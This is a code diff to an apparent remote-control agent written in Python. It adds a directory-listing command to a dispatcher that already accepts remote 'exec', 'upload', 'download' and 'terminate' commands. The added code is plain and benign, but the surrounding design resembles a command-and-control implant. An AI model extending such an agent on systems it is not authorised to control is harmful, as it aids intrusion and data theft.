@@ -123,6 +123,41 @@ def execute_terminate_command():
     }
 
 
+def execute_list_directory_command(command_data):
+    """List directory contents"""
+    try:
+        path = command_data.get('path', '')
+        print(f"[DEBUG] execute_list_directory_command() received request")
+        print(f"[DEBUG] Path to list: '{path}'")
+
+        if not path:
+            print("[DEBUG] Error: No path specified")
+            return {'status': 'error', 'error': 'No path specified'}
+
+        result = list_directory(path)
+        # list_directory already returns JSON, so parse it
+        import json
+        result_data = json.loads(result)
+
+        if result_data.get('status') == 'success':
+            num_items = len(result_data.get('items', []))
+            print(f"[DEBUG] Command succeeded: {num_items} items returned")
+            return {
+                'status': 'success',
+                'result': result  # Return the JSON string
+            }
+        else:
+            error_msg = result_data.get('error', 'Unknown error')
+            print(f"[DEBUG] Command failed: {error_msg}")
+            return {
+                'status': 'error',
+                'error': error_msg
+            }
+    except Exception as e:
+        print(f"[DEBUG] Exception in execute_list_directory_command: {e}")
+        return {'status': 'error', 'error': str(e)}
+
+
 def execute_command_by_type(command):
     """Route command to appropriate handler based on type"""
     cmd_type = command.get('type', 'exec')
@@ -134,6 +169,8 @@ def execute_command_by_type(command):
         return execute_upload_command(cmd_data)
     elif cmd_type == 'download':
         return execute_download_command(cmd_data)
+    elif cmd_type == 'list_directory':
+        return execute_list_directory_command(cmd_data)
     elif cmd_type == 'terminate':
         return execute_terminate_command()
     else:
